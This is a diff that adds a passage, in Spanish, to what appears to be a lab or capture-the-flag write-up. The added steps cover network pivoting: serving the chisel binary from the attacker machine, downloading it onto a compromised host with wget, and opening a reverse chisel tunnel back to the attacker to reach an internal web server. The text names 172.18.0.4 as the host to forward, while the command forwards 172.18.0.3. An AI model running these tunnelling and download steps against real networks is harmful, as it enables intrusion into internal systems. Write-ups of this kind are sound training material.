@@ -356,3 +356,37 @@ el host `172.18.0.2` tiene el puerto 3306 abierto. este host esta albergando la 
 el host `172.18.0.4` tiene el puerto 80 abierto. este es el que nos interesa ya que los otros dos no se pueden explotar
 ![[Pasted image 20240908012806.png]]
 
+Entonces realizaremos un port forwarding del puerto `80` del host `172.18.0.4`. Para ello usaremos la herramienta `chisel`.
+
+- [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+
+Para subir el binario de chisel haremos uso de python3
+
+```c
+ ❯ python3 -m http.server 80
+```
+
+```c
+wget http://192.168.226.5/chisel    
+chmod +x chisel
+```
+
+#### Port Forwarding
+
+Para realizar port forwarding y para tener mas informacion de realizarlo podemos revisar el siguiente sitio web:
+
+- [https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel](https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel)
+
+Maquina atacante:
+
+```c
+❯ ./chisel server  --reverse --port 8888
+```
+
+Maquina cliente - 172.18.0.4 
+
+```c
+./chisel client 192.168.226.5:8888 R:8001:172.18.0.3:80 
+```
+
+Luego de realizar el port forwarding podremos ver el sitio web de host `172.18.0.3`
